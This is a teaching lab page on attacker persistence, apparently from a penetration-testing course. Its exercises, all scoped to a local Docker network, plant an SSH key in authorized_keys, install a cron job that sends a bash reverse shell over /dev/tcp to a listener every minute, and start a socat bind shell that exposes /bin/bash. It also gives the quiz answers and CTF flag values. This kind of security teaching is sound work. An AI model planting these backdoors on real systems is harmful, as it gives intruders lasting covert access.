---
title: "Persistence & Backdoors"
teaching: 20
exercises: 65
---

:::::::::::::::::::::::::::::::::::::: questions

- How do you plant an SSH key that provides access independent of a password?
- How can you prove a persistence mechanism actually survives a credential rotation, rather than just assuming it does?
- How do cron-triggered reverse shells and socat bind shells work, and what are the tradeoffs between them?
- What's the practical difference between a reverse shell and a bind shell?

::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: objectives

- Plant an SSH key for persistence independent of password authentication
- Prove a persistence mechanism survives credential rotation, not just assume it does
- Set up a cron-triggered reverse shell
- Set up and connect to a socat bind shell
- Reason about the tradeoffs (timing, visibility, network direction) between persistence techniques

::::::::::::::::::::::::::::::::::::::::::::::::

## Introduction

Getting in once isn't the job — real engagements (and real attackers) need
access that survives a password rotation, a reboot, or the original
vulnerability being patched. This lab starts with a foothold already given,
and has you plant three different persistence mechanisms, then prove they
work by rotating the target's credentials yourself and getting back in
anyway.

::::::::::::::::::::::::::::::::::::: callout

### Scope note

Every command below targets only the containers started by this lab's own
`docker-compose.yaml` (subnet `10.10.10.0/24`). Don't point these tools
anywhere else. See the [statutory warning on the lesson home page](../index.html)
and [Setup](../learners/setup.html) before you begin.

::::::::::::::::::::::::::::::::::::::::::::::::

**Tools used:** `ssh-keygen`, `cron`, `netcat`, `socat`
**Network:** `lab10-attacker` (10.10.10.2, Kali) · `lab10-target` (10.10.10.10, SSH target — foothold given, cron and netcat/socat available)

Follow [Setup](../learners/setup.html) to build the shared attacker image,
then:

```bash
cd episodes/files/lab10-persistence
docker compose up -d
docker exec -it lab10-attacker bash
```

## Setup: Confirm Your Starting Foothold

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 0.1: Confirm your starting foothold

```bash
ssh lowpriv@10.10.10.10
# password: lowpriv123
cat user.txt
exit
```

What flag does `user.txt` contain?

:::::::::::::::::::::::: solution

`flag{lab10_initial_foothold}`

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Part 1: SSH Key Persistence

A planted SSH key survives a password change completely — it's a separate
authentication method entirely.

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 1.1: Generate a keypair on the attacker

```bash
ssh-keygen -t ed25519 -f /root/.ssh/lab10_key -N ""
cat /root/.ssh/lab10_key.pub
```

What does `-N ""` do here?

:::::::::::::::::::::::: solution

It sets an empty passphrase on the private key, so it can be used
non-interactively (for example from a cron job or a script) without being
prompted to unlock it.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 1.2: Plant it on the target

Using your password-based access:

```bash
cat /root/.ssh/lab10_key.pub | ssh lowpriv@10.10.10.10 "cat >> ~/.ssh/authorized_keys"
# password: lowpriv123
```

Why does this command append (`>>`) rather than overwrite the
`authorized_keys` file?

:::::::::::::::::::::::: solution

Appending preserves any keys that are already trusted for that account —
overwriting the file would remove existing legitimate access alongside
whatever you're planting. `authorized_keys` can hold multiple keys, one per
line, all of which are independently valid.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 1.3: Confirm key-based login works

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "whoami"
```

Did it log in without asking for a password?

:::::::::::::::::::::::: solution

Yes — the command returns `lowpriv` with no password prompt, since SSH
authenticated using the private key instead.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Part 2: Prove It Survives Credential Rotation

This is the actual test — not just "did the key work," but "does it still
work once the thing you originally used is gone."

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 2.1: Rotate the password yourself

Playing the role of a defender who found and fixed the weak password (but
not your planted key). This needs an interactive terminal (`-t`), since
`passwd` prompts for input:

```bash
ssh -t -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "passwd"
# follow the prompts: current password lowpriv123, then set a new one, e.g. N3wStr0ngPass!
```

Why does this command authenticate with `-i /root/.ssh/lab10_key` rather
than the original password?

:::::::::::::::::::::::: solution

Because the exercise is simulating a defender rotating the password — the
command needs a way *in* to run `passwd` in the first place, and using the
planted key (rather than the soon-to-be-rotated password) demonstrates that
the key is already a fully independent access path before the rotation even
happens.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 2.2: Confirm the original password no longer works

```bash
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no lowpriv@10.10.10.10 "whoami"
# should now fail
```

Did the old password get rejected?

:::::::::::::::::::::::: solution

Yes — forcing password-only authentication (`PubkeyAuthentication=no`) and
supplying the old password (`lowpriv123`) fails, since Exercise 2.1 already
rotated it to a new value.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 2.3: Confirm your key still gets you in

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "cat root.txt"
```

1. What flag does `root.txt` contain?
2. In your own words — why does an SSH key survive a password rotation, when
   both are technically "credentials" for the same account?

:::::::::::::::::::::::: solution

1. `flag{lab10_persistence_survived_rotation}`
2. Password authentication and public-key authentication are two entirely
   separate mechanisms checked independently by `sshd` — a password lives in
   `/etc/shadow` while a trusted public key lives in `~/.ssh/authorized_keys`.
   Changing the password only updates the shadow entry; it does nothing to
   the `authorized_keys` file, so the key keeps working exactly as before.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Part 3: Cron Backdoor — a Reverse Shell That Phones Home

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 3.1: Start a listener on your attacker machine

In a **second terminal** (`docker exec -it lab10-attacker bash`):

```bash
nc -lvnp 4444
```

What do the `-l`, `-v`, `-n`, and `-p` flags each do?

:::::::::::::::::::::::: solution

`-l` listens for an incoming connection instead of initiating one; `-v` is
verbose output; `-n` skips DNS resolution of the connecting host; `-p 4444`
sets the local port to listen on.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 3.2: Plant a cron job on the target

Back in your first session:

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 \
  '(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.10.10.2/4444 0>&1\"") | crontab -'
```

This adds a job that fires every minute and opens a reverse shell back to
your attacker box. What does `crontab -l 2>/dev/null` accomplish in this
pipeline?

:::::::::::::::::::::::: solution

It preserves any existing cron jobs by listing them first (with stderr
discarded in case there is no crontab yet, which would otherwise print an
error), so the new backdoor job is appended to the existing crontab via the
pipe into `crontab -`, rather than replacing everything the user already had
scheduled.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 3.3: Wait for it to fire

Cron runs on the minute — wait up to 60 seconds and watch your `nc`
listener.

1. Did you get a shell?
2. What's the practical downside of a cron-based backdoor compared to the
   SSH key you planted in Part 1? Think about timing, reliability, and how
   "loud" each one is.

:::::::::::::::::::::::: solution

1. Yes — within 60 seconds the listener in Exercise 3.1 receives an
   interactive `bash` shell connection from the target.
2. A cron backdoor only fires on its schedule (here, once a minute) instead
   of being available on demand like the SSH key, so there's an unavoidable
   delay to get back in. It's also "louder": a crontab entry referencing
   `/dev/tcp` and a reverse shell one-liner is a distinctive, easy-to-spot
   artifact for a defender who checks `crontab -l`, whereas a single extra
   line in `authorized_keys` blends in far more easily.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

Clean up the cron job when you're done:

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "crontab -r"
```

## Part 4: A Bind Shell with socat

A reverse shell connects *out* from the target to you. A bind shell does the
opposite — it listens *on* the target, and you connect *to* it.

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 4.1: Start a bind shell listener on the target

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 \
  "nohup socat TCP-LISTEN:4445,reuseaddr,fork EXEC:/bin/bash > /dev/null 2>&1 & disown; sleep 1; echo started"
```

What does the `fork` option to `TCP-LISTEN` do, and why does it matter for a
bind shell you might connect to more than once?

:::::::::::::::::::::::: solution

`fork` makes `socat` spawn a new child process to handle each incoming
connection and keep listening for more, instead of exiting after the first
client disconnects. Without it, the bind shell would only be usable once.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Exercise 4.2: Connect to it directly

```bash
socat - TCP:10.10.10.10:4445
whoami
exit
```

A reverse shell needs your listener reachable from the target's network. A
bind shell needs the target's port reachable from yours. In a real
engagement behind NAT/firewalls, which direction is usually easier to get
through, and why?

:::::::::::::::::::::::: solution

A reverse shell is usually easier: outbound connections from an internal
target to the internet are commonly allowed by default (workstations and
servers routinely reach out for updates, DNS, HTTPS, and so on), while
inbound connections to an arbitrary internal port are typically blocked by
NAT and firewalls unless someone has explicitly opened it. A bind shell
requires that inbound path to already exist, which is the less common case.

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Quick Knowledge Check

::::::::::::::::::::::::::::::::::::: challenge

### Check your understanding

1. Why does a planted SSH public key survive a password rotation?
   - A) It doesn't — both break together
   - B) Key-based and password-based auth are independent mechanisms; changing one doesn't affect the other
   - C) SSH keys are stored in the password file
   - D) It requires the old password to keep working
2. What's the main weakness of a cron-based backdoor compared to a planted SSH key?
   - A) None, they're equivalent
   - B) It only fires on a schedule (e.g. once a minute) rather than being available instantly, and a visible crontab entry is easy for defenders to spot
   - C) Cron doesn't work in containers
   - D) It requires a GUI
3. What's the fundamental difference between a reverse shell and a bind shell?
   - A) No difference
   - B) A reverse shell connects out from the target to the attacker; a bind shell listens on the target for the attacker to connect in
   - C) A bind shell is always encrypted
   - D) A reverse shell requires root
4. Why did Part 2 rotate the password instead of just checking the key worked from the start?
   - A) No real reason
   - B) To prove the persistence mechanism is actually independent of the original access method, not just redundant with it
   - C) It's required by SSH
   - D) To test network speed
5. In `(crontab -l 2>/dev/null; echo "...") | crontab -`, what does `crontab -l 2>/dev/null` accomplish?
   - A) Nothing
   - B) Preserves any existing cron jobs by listing them first, so the new job is appended rather than replacing everything
   - C) Lists all users' crontabs
   - D) Deletes the crontab

:::::::::::::::::::::::: solution

1. B
2. B
3. B
4. B
5. B

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::: challenge

### Optional: CTF challenge

Once you've completed the exercises above, try the optional flag-capture
challenge: two flags are hidden on `lab10-target` (10.10.10.10) —
`user.txt` (earned using the given starting foothold) and `root.txt`
(earned only after you rotate the account's password yourself and prove a
persistence mechanism you planted still gets you back in). Target
`10.10.10.10` only, attack from `lab10-attacker`, flag format `flag{...}`.
No hints below — ask your instructor if you get stuck.

:::::::::::::::::::::::: instructor

The full CTF walkthrough for this lab (including both flag values and the
exact steps) is provided separately to instructors rather than inline here,
so it stays out of a learner's browser history/search results. See the
[instructor notes](../instructors/lab10-notes.html).

:::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

## Cleanup

```bash
exit
cd episodes/files/lab10-persistence
docker compose down
```

:::::::::::::::::::::::::::::::::::::: keypoints

- A planted SSH public key in `~/.ssh/authorized_keys` is an authentication
  method fully independent of the account's password — rotating the
  password does not touch it
- The only way to prove a persistence mechanism is genuinely independent of
  the original access method is to remove that original access (here, by
  rotating the password) and confirm the mechanism still works
- A cron-triggered reverse shell (`* * * * * ... /dev/tcp/...`) only fires on
  its schedule and leaves an easily spotted crontab artifact, trading
  stealth and instant access for simplicity
- A reverse shell connects *out* from the target to a listener you control;
  a bind shell listens *on* the target for you to connect *in* — reverse
  shells are generally easier to get through NAT/firewalls since outbound
  connections are more often allowed
- `socat TCP-LISTEN:<port>,reuseaddr,fork EXEC:/bin/bash` spins up a
  reusable bind shell that can accept more than one connection

::::::::::::::::::::::::::::::::::::::::::::::::
